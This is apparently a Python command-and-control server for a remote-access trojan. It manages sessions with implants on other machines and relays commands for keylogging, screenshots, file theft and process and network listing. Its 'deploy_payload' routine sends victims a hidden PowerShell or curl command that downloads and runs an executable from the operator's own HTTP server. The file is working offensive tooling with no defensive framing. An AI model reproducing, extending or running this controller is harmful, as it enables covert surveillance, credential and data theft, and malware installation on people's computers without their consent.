import ipaddress
import os
import re
import socket
import sys
import threading
import time
import http.server
import socketserver
import urllib.request

PURPLE = "\033[95m"
RESET = "\033[0m"

banner = r"""
 ██████╗ ██████╗ ███╗   ██╗████████╗██████╗  ██████╗ ██╗     ██╗     ███████╗██████╗ 
██╔════╝██╔═══██╗████╗  ██║╚══██╔══╝██╔══██╗██╔═══██╗██║     ██║     ██╔════╝██╔══██╗
██║     ██║   ██║██╔██╗ ██║   ██║   ██████╔╝██║   ██║██║     ██║     █████╗  ██████╔╝
██║     ██║   ██║██║╚██╗██║   ██║   ██╔══██╗██║   ██║██║     ██║     ██╔══╝  ██╔══██╗
╚██████╗╚██████╔╝██║ ╚████║   ██║   ██║  ██║╚██████╔╝███████╗███████╗███████╗██║  ██║
 ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
"""
print(PURPLE + banner + RESET)

if len(sys.argv) < 3:
    print(f"Usage: python {sys.argv[0]} <LHOST> <LPORT> [HTTP_PORT]")
    sys.exit(1)

try:
    host = str(ipaddress.ip_address(sys.argv[1]))
except ValueError:
    print("[-] Invalid IP address, please try again.")
    sys.exit(1)
    
try:
    port = int(sys.argv[2])
    http_port = int(sys.argv[3]) if len(sys.argv) > 3 else 8000
    if not (1 <= port <= 65535 and 1 <= http_port <= 65535):
        raise ValueError
except ValueError:
    print("[-] Invalid port number, please try again.")
    sys.exit(1)

sessions = {}
session_counter = 1
sessions_lock = threading.Lock()

def start_http_server(http_host, h_port):
    class QuietHandler(http.server.SimpleHTTPRequestHandler):
        def log_message(self, format, *args):
            return 
            
    try:
        if '__file__' in globals():
            os.chdir(os.path.dirname(os.path.abspath(__file__)))
        with socketserver.TCPServer((http_host, h_port), QuietHandler) as httpd:
            print(f"[+] HTTP server started on http://{http_host}:{h_port} (Serving payloads directory)")
            httpd.serve_forever()
    except Exception as e:
        print(f"[-] Failed to start HTTP server: {e}")

def get_payload_for_target(server_url, current_os):
    try:
        with urllib.request.urlopen(server_url) as response:
            html_content = response.read().decode('utf-8')
        
        files = re.findall(r'href="([^"]+)"', html_content)
        target_file = None
        
        if "windows" in current_os.lower():
            for f in files:
                if f.lower().endswith('.exe'):
                    target_file = f
                    break
        else:
            for f in files:
                if not f.lower().endswith('.exe') and f not in ['.', '..']:
                    target_file = f
                    break
        return target_file
    except Exception as e:
        print(f"[-] Failed to fetch file list from HTTP server: {e}")
        return None

def close_session(session_id):
    with sessions_lock:
        session = sessions.pop(session_id, None)
    if session is None:
        return
    conn = session["conn"]
    try:
        conn.shutdown(socket.SHUT_RDWR)
    except OSError:
        pass
    try:
        conn.close()
    except OSError:
        pass

def listener_thread(s):
    global session_counter
    while True:
        try:
            conn, addr = s.accept()
            conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            hostname = "UNKNOWN"
            try:
                conn.sendall(b"hostname")
                buffer = bytearray()
                conn.settimeout(3.0)
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    buffer.extend(data)
                    if b"---EOF---" in buffer:
                        break
                conn.settimeout(None)
                hostname = buffer.replace(b"---EOF---", b"").decode(errors='ignore').strip()
            except:
                pass

            with sessions_lock:
                current_id = session_counter
                sessions[current_id] = {
                    "conn": conn,
                    "addr": addr,
                    "hostname": hostname
                }
                session_counter += 1
                
            print(f"\n[+] Session {current_id} connected ({addr[0]})\nServer panel > ", end="", flush=True)
        except Exception:
            break

def interact_session(session_id):
    with sessions_lock:
        if session_id not in sessions:
            print(f"[-] Session {session_id} does not exist.")
            return
        sess = sessions[session_id]
        conn = sess["conn"]
        addr = sess["addr"]
        hostname = sess["hostname"]

    print(f"\n[*] Interacting with session {session_id} ({hostname} - {addr[0]}). Type 'background' to return to main menu.\n")

    while True:
        try:
            message = input(f"Session {session_id} ({hostname}) > ")
            
            if not message.strip():
                continue
                
            if message.lower() == "background":
                print("[*] Backgrounding session...")
                break
                
            if message.lower() == "deploy_payload":
                print("[*] Detecting target OS and selecting appropriate payload...")
                try:
                    conn.sendall(b"sysinfo")
                    conn.settimeout(3.0)
                    buf = bytearray()
                    while True:
                        d = conn.recv(1024)
                        if not d: break
                        buf.extend(d)
                        if b"---EOF---" in buf: break
                    conn.settimeout(None)
                    target_os_info = buf.replace(b"---EOF---", b"").decode(errors='ignore')
                except:
                    target_os_info = "unknown"

                server_url = f"http://{host}:{http_port}"
                payload_filename = get_payload_for_target(server_url, target_os_info)
                
                if not payload_filename:
                    print("[-] Could not find a suitable payload on the HTTP server.")
                    continue
                
                print(f"[+] Selected payload for target: {payload_filename}")
                
                if "windows" in target_os_info.lower():
                    deploy_cmd = f"powershell -WindowStyle Hidden -Command \"(New-Object System.Net.WebClient).DownloadFile('{server_url}/{payload_filename}', \"$env:TEMP\\{payload_filename}\"); Start-Process \"$env:TEMP\\{payload_filename}\"\""
                else:
                    deploy_cmd = f"curl -s {server_url}/{payload_filename} -o /tmp/{payload_filename} && chmod +x /tmp/{payload_filename} && /tmp/{payload_filename} &"
                
                print("[*] Sending deployment command to agent...")
                conn.sendall(deploy_cmd.encode())
                
                # קבלת תגובה מהפעלה
                buffer = bytearray()
                try:
                    conn.settimeout(5.0)
                    while True:
                        data = conn.recv(1024)
                        if not data: break
                        buffer.extend(data)
                        if b"---EOF---" in buffer: break
                except:
                    pass
                finally:
                    conn.settimeout(None)
                
                if buffer:
                    print(buffer.replace(b"---EOF---", b"").decode(errors='ignore'))
                continue

            parts = message.split(' ', 1)
            command_name = parts[0].lower()
            arg = parts[1] if len(parts) > 1 else ""
            
            allowed_commands = ["hostname", "whoami", "pwd", "sysinfo", "ls", "cd", "ps", "help", "modules", "start", "stop", "status", "keylog_start", "keylog_stop", "keylog_dump", "upload", "download", "netstat", "screenshot", "idletime"]
            if command_name not in allowed_commands:
                print("Unavailable command. Type 'help' to view available commands (or 'deploy_payload' to drop/run payload).\n")
                continue
            
            try:
                conn.sendall(message.encode())
            except (BrokenPipeError, ConnectionRefusedError, ConnectionResetError, OSError) as e:
                print(f"[-] Connection lost: {e}")
                close_session(session_id)
                break
                
            if command_name == "download":
                try:
                    buffer = bytearray()
                    while True:
                        data = conn.recv(1024)
                        if not data: break
                        buffer.extend(data)
                        if b"---EOF---" in buffer: break
                    response = buffer.replace(b"---EOF---", b"")
                    if response.startswith(b"[-] Error") or response.startswith(b"Path not provided"):
                        print(response.decode(errors='ignore'))
                    else:
                        if b"\n" in response:
                            header, file_data = response.split(b"\n", 1)
                            if header.startswith(b"SIZE:"):
                                output_filename = os.path.basename(arg)
                                with open(output_filename, "wb") as f:
                                    f.write(file_data)
                                print(f"[+] File downloaded successfully and saved as: {output_filename}\n")
                            else:
                                print(response.decode(errors='ignore'))
                except Exception as e:
                    print(f"[-] Error during download: {e}\n")
                continue
            
            if command_name == "upload":
                try:
                    ack = conn.recv(1024)
                    if b"READY_FOR_UPLOAD" in ack:
                        if not os.path.exists(arg):
                            print(f"[-] Local file {arg} not found.\n")
                            conn.sendall(b"---EOF---")
                            continue
                        with open(arg, "rb") as f:
                            while True:
                                chunk = f.read(1024)
                                if not chunk: break
                                conn.sendall(chunk)
                        time.sleep(0.1)
                        conn.sendall(b"---EOF---")
                        conf = conn.recv(1024)
                        print(conf.replace(b"---EOF---", b"").decode(errors='ignore'))
                    else:
                        print(ack.decode(errors='ignore'))
                except Exception as e:
                    print(f"[-] Error during upload: {e}\n")
                continue
            
            if command_name == "screenshot":
                try:
                    buffer = bytearray()
                    while True:
                        data = conn.recv(4096)
                        if not data: break
                        buffer.extend(data)
                        if b"---EOF---" in buffer: break
                    
                    response = buffer.replace(b"---EOF---", b"")
                    if response.startswith(b"[-] Error"):
                        print(response.decode(errors='ignore'))
                    else:
                        if b"\n" in response:
                            header, image_data = response.split(b"\n", 1)
                            if header.startswith(b"SIZE:"):
                                output_filename = f"screenshot_{int(time.time())}.png"
                                with open(output_filename, "wb") as f:
                                    f.write(image_data)
                                print(f"[+] Screenshot downloaded and saved successfully as: {output_filename}\n")
                            else:
                                print(response.decode(errors='ignore'))
                except Exception as e:
                    print(f"[-] Error during screenshot capture: {e}\n")
                continue 
            
            buffer = bytearray()
            try:
                conn.settimeout(5.0)
                while True:
                    data = conn.recv(1024)
                    if not data: break
                    buffer.extend(data)
                    if b"---EOF---" in buffer: break
            except (socket.timeout, ConnectionRefusedError, ConnectionResetError, TimeoutError, OSError) as e:
                print(f"[-] Connection lost while waiting for reply: {e}")
                close_session(session_id)
                break
            finally:
                conn.settimeout(None)
            
            if not buffer:
                print("[-] Connection with payload closed.")
                close_session(session_id)
                break
                
            output = buffer.replace(b"---EOF---", b"").decode(errors='ignore')
            print(output)
            
        except Exception as e:
            print(f"[-] Connection with payload closed.: {e}")
            close_session(session_id)
            break

def main():
    http_thread = threading.Thread(target=start_http_server, args=(host, http_port), daemon=True)
    http_thread.start()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        s.listen(5)
        print(f"[+] Multi-client listener started on {host}:{port}...\n")
        
        t = threading.Thread(target=listener_thread, args=(s,), daemon=True)
        t.start()
        
        print("Type 'sessions' to list connected agents, 'interact <ID>' to control, or 'quit' to exit.\n")
        
        while True:
            try:
                cmd_input = input("Server panel > ").strip()
                if not cmd_input:
                    continue
                    
                if cmd_input.lower() == "quit":
                    print("Shutting down server...")
                    with sessions_lock:
                        session_ids = list(sessions.keys())
                    for sid in session_ids:
                        close_session(sid)
                    break
                    
                elif cmd_input.lower() == "sessions":
                    with sessions_lock:
                        if not sessions:
                            print("[-] No active sessions.\n")
                            continue
                        print("\nID    HOSTNAME       IP")
                        print("-" * 30)
                        for sid, data in sessions.items():
                            print(f"{sid:<5} {data['hostname']:<14} {data['addr'][0]}")
                        print()
                        
                elif cmd_input.lower().startswith("interact "):
                    parts = cmd_input.split(' ', 1)
                    try:
                        target_id = int(parts[1])
                        interact_session(target_id)
                    except ValueError:
                        print("[-] Invalid Session ID format. Use: interact <ID>\n")
                else:
                    print("Unknown command. Available main commands: sessions, interact <ID>, quit\n")
            except KeyboardInterrupt:
                print("\nUse 'quit' to exit.")

if __name__ == "__main__":
    main()
